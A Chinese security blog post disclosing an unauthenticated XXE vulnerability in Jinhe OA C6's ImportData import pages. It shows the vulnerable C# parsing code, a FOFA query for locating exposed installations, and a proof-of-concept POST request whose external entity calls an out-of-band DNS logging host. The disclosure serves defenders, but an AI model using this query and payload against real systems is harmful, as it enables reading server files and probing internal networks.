---
title: "金和OA JHSoft.Web.CostControl.Importing ImportData 多个XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-EatImport-xxe.html
asset_dir: assets/金和oa-jhsoft.web.costcontrol.importing-importdata-多个xxe漏洞
---

# 金和OA JHSoft.Web.CostControl.Importing ImportData 多个XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/12/28 13:05
- 261浏览
- [0评论](#comment)
- 12分钟阅读

深入探索

漏洞预警服务

安全

网络安全培训

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `JHSoft.Web.CostControl.Importing` `ImportData` 方法处存在[XXE](https://mrxn.net/tag/XXE)漏洞被多个系统文件使用，如`EatImport.aspx`、`PoolListImport.aspx`、`RegionTypeListImport.aspx`、`SharingListImport.aspx`、`StayListImport.aspx`、`SubjectListImport.aspx`等，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞预警服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

深入探索

安全认证考试

技术文章订阅

安全工具开发

[![金和OA JHSoft.Web.CostControl.Importing ImportData 多个XXE漏洞](images/img-001-c9f95b92e182.webp)](https://image.mrxn.net/5ee670e8dcf94803b81514f55368b2c8.webp)

直接看下使用的**ImportData**方法是如何实现的

网络安全

深入探索

漏洞修复方案

VPN服务

企业安全咨询

```
protected string ImportData()
{
  string str = string.Empty;
  int num1 = 0;
  int num2 = 0;
  string end = ((TextReader) new StreamReader(this.Request.InputStream)).ReadToEnd();
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.LoadXml(end);
  XmlElement documentElement = xmlDocument.DocumentElement;
```

请求内容直接使 `xmlDataDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

其他几个页面`PoolListImport.aspx`、`RegionTypeListImport.aspx`、`SharingListImport.aspx`、`StayListImport.aspx`、`SubjectListImport.aspx`等都是同样的使用方法，就不一一复现了。

# 漏洞复现

```
POST /c6/JHSoft.Web.CostControl/Importing/EatImport.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到请求

漏洞预警服务

[![金和OA JHSoft.Web.CostControl.Importing ImportData 多个XXE漏洞](images/img-002-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
